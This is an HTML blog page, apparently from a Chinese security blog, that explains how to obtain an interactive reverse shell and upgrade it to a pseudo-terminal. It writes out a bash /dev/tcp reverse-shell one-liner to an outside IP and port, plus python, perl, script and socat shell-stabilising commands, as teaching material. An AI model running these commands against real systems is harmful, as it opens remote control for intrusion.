@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="怎么利用获取交互式shell？原理是什么？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="获取交互式shell精讲">
+<meta property="og:url" content="https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/index.html">
+<meta property="og:site_name" content="killeveee">
+<meta property="og:description" content="怎么利用获取交互式shell？原理是什么？">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-11-28T07:11:33.000Z">
+<meta property="article:modified_time" content="2023-12-14T13:57:00.938Z">
+<meta property="article:author" content="killeveee">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>获取交互式shell精讲</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%BF%E5%8A%BF%E9%9B%86%E6%80%BB/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&text=获取交互式shell精讲"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&is_video=false&description=获取交互式shell精讲"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=获取交互式shell精讲&body=Check out this article: https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&name=获取交互式shell精讲&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&t=获取交互式shell精讲"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">bash获得反向Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">网络套接字Socket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">标准输出&gt;&amp;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">提示没有 tty</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">script获取pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">python获得pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">Perl获得pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">socat获得pty</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        获取交互式shell精讲
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">killeveee</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-11-28T07:11:33.000Z" class="dt-published" itemprop="datePublished">2023-11-28</time>
+        
+      
+    </div>
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>解决问题：怎么利用获取交互式shell？原理是什么？</p>
+<h1><span id="bash获得反向shell">bash获得反向Shell</span></h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">bash <span class="token operator">-</span>i <span class="token operator">></span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.2</span><span class="token number">.134</span><span class="token operator">/</span><span class="token number">4444</span> <span class="token number">0</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>解释每个部分：</p>
+<ul>
+<li>bash： 启动一个Bash shell。</li>
+<li>-i： 以<strong>交互式模式</strong>运行，这样用户可以与shell进行交互。</li>
+<li><blockquote>
+<p>&amp;： 将标准输出（文件描述符1）和标准错误输出（文件描述符2）合并。</p>
+</blockquote>
+</li>
+<li>&#x2F;dev&#x2F;tcp&#x2F;192.168.2.134&#x2F;4444： 这是一个特殊的构造，它试图打开一个TCP连接到指定的IP地址（192.168.2.134）和端口号（4444）。在这里，&#x2F;dev&#x2F;tcp是一个特殊的文件系统，Bash试图将其解释为一个<strong>网络套接字</strong>。如果这个连接成功建立，那么接下来的输入输出将与这个套接字相关联。</li>
+<li>0&gt;&amp;1： 将标准输入（文件描述符0）重定向到标准输出。这意味着用户输入将被发送到网络连接，而不是终端。</li>
+</ul>
+<p>这个命令的目的是在远程主机（192.168.2.134）的4444端口上启动一个Bash shell，并将输入和输出通过网络连接。这种技术通常用于建立一个<strong>反向Shell</strong>，这样攻击者就可以通过该连接执行命令，并获得远程系统的控制权。</p>
+<blockquote>
+<p><code>man bas</code>获得bash的帮助手册。</p>
+</blockquote>
+<h2><span id="网络套接字socket">网络套接字Socket</span></h2><p>网络套接字是一种网络编程的抽象，用于在计算机网络上进行通信。套接字（Socket）是一种通信机制，它允许在不同计算机之间的进程进行数据交换。在Linux和类Unix系统中，套接字通常以文件描述符的形式存在。</p>
+<p>在这个特定的Bash命令中，&#x2F;dev&#x2F;tcp&#x2F;192.168.2.134&#x2F;4444的部分是一个尝试使用Bash的特殊文件系统来打开一个TCP套接字。在Bash中，&#x2F;dev&#x2F;tcp和&#x2F;dev&#x2F;udp是一种特殊的文件系统，允许将I&#x2F;O操作重定向到实际的网络套接字。</p>
+<p>当使用 &gt;&amp; 将标准输出和标准错误输出合并时，命令的输入输出将被定向到这个套接字。0&gt;&amp;1 将标准输入重定向到标准输出，这样用户输入将通过网络连接发送，而不是终端。因此，通过这个网络连接，可以在远程主机上执行Bash shell，并将输入输出通过网络传输。</p>
+<p>总体而言，这种技术通常被称为反向Shell，因为它是一个由目标系统启动并与攻击者的系统建立连接的Shell。</p>
+<h2><span id="标准输出gtamp">标准输出&gt;&amp;</span></h2><p>在Unix-like系统中，每个运行的进程都有三个标准文件描述符：</p>
+<ol>
+<li>标准<strong>输入</strong>（stdin，文件描述符<strong>0</strong>）： 通常用于接收输入数据。默认情况下，它通常与终端关联。</li>
+<li>标准<strong>输出</strong>（stdout，文件描述符<strong>1</strong>）： 用于输出正常的运行信息。默认情况下，它通常与终端关联。</li>
+<li>标准<strong>错误输出</strong>（stderr，文件描述符<strong>2</strong>）： 用于输出错误信息。默认情况下，它通常与终端关联。</li>
+</ol>
+<p>将<code>标准输出</code>和<code>标准错误输出</code>合并意味着将它们指向相同的地方，以便它们共享同一个输出目标。在Bash中，可以使用 <code>**&gt;&amp;**</code> 来实现这一点。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">></span> <span class="token function">file</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上述命令将 标准输出 重定向到文件file，并将 标准错误输出 指向与 标准输出 相同的地方（这里是文件 file）。因此，标准输出和标准错误输出都被追加到同一个文件(file)中。<br>在你提到的Bash命令中：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/192.168.2.134/4444 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这部分 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.134&#x2F;4444<br>将 标准输出 和 标准错误输出 合并（&gt;&amp;），<br>并重定向到指定的TCP套接字（&#x2F;dev&#x2F;tcp&#x2F;192.168.2.134&#x2F;4444）。<br>而 0&gt;&amp;1 将 标准输入 重定向到标准输出，从而<strong>将用户的输入也发送到了同一个TCP套接字</strong>。这就实现了<strong>输入输出</strong>通过网络连接的目的，允许在远程主机上执行交互式Bash shell。</p>
+<h1><span id="提示没有-tty">提示没有 tty</span></h1><p>在某些情况下，当使用Bash通过网络连接获取交互式Shell时，可能会导致<code>top</code>等命令报告没有<strong>tty</strong>（终端）。</p>
+<blockquote>
+<p>这是因为top等一些工具通常会检查<strong>当前进程是否与一个终端（tty）相关联</strong>，以决定如何以及何种方式显示信息。在这种情况下，由于Bash被用于通过网络连接进行交互，而不是通过终端，top可能会在检查tty时报告没有找到。</p>
+</blockquote>
+<p>为了解决这个问题，可以使用script命令或script命令的变种，例如script &#x2F;dev&#x2F;null，来创建一个<code>伪终端pty</code>。这样，top等工具就会认为它们正在与一个终端进行交互，而不会报告没有tty的错误。</p>
+<h2><span id="script获取pty">script获取pty</span></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">script /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样，你可以欺骗top，使其认为它与一个终端相关联，从而解决这个问题。<br>让我逐步解释这个命令：</p>
+<ol>
+<li>script： 这是一个用于<strong>记录 shell 会话的命令</strong>。它会创建一个伪终端并将终端的输入和输出记录到指定的文件中（默认是typescript）。</li>
+<li>&#x2F;dev&#x2F;null：&#x2F;dev&#x2F;null 是一个特殊的设备文件，<strong>用于丢弃数据</strong>。在这里，它作为输出文件名传递给 script 命令，表示不实际记录到文件，而是<strong>将记录的输出直接丢弃</strong>。</li>
+</ol>
+<p>所以，script &#x2F;dev&#x2F;null 的效果是<strong>创建一个伪终端，但将记录的输入和输出都丢弃，不会将其写入文件</strong>。这种用法通常用于欺骗某些程序，使它们认为正在与终端进行交互，从而绕过一些可能与非交互式 shell 有关的问题。</p>
+<h2><span id="python获得pty">python获得pty</span></h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这是一个使用Python来提升shell的交互性的命令。具体来说，这个命令使用pty模块来创建一个伪终端（pseudo terminal，pty），然后在该伪终端上启动一个交互式的Bash shell。<br>让我逐步解释这个命令：</p>
+<ol>
+<li>python： 启动Python解释器。</li>
+<li>-c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’： 在Python解释器中执行的命令。这段代码使用<strong>pty模块</strong>，其中的<strong>spawn函数</strong>会创建一个子进程，并将其<strong>连接到一个伪终端</strong>。然后，它在这个伪终端上启动了一个Bash shell (&#x2F;bin&#x2F;bash)。<blockquote>
+<p>这种技术通常被称为pty shell或伪终端shell，它可以提高交互性，允许诸如命令历史记录和自动补全等功能的正常工作。</p>
+</blockquote>
+</li>
+</ol>
+<h2><span id="perl获得pty">Perl获得pty</span></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">perl -e <span class="token string">'exec "/bin/bash";'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这个命令使用 Perl 来执行 &#x2F;bin&#x2F;bash，可能会分配一个伪终端</p>
+<h2><span id="socat获得pty">socat获得pty</span></h2><p>如果 socat 工具可用，可以使用它来创建一个连接到终端的伪终端：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat file:<span class="token variable"><span class="token variable">`</span><span class="token function">tty</span><span class="token variable">`</span></span>,raw,echo<span class="token operator">=</span><span class="token number">0</span> tcp-listen:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>在这个例子中，socat会将连接的终端作为一个文件传递给 tty 命令，然后创建一个 TCP 监听器。你可以通过连接到这个监听器来获取一个伪终端。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">bash获得反向Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">网络套接字Socket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">标准输出&gt;&amp;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">提示没有 tty</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">script获取pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">python获得pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">Perl获得pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">socat获得pty</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&text=获取交互式shell精讲"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&is_video=false&description=获取交互式shell精讲"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=获取交互式shell精讲&body=Check out this article: https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&title=获取交互式shell精讲"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&name=获取交互式shell精讲&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2023/11/28/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/&t=获取交互式shell精讲"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    killeveee
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
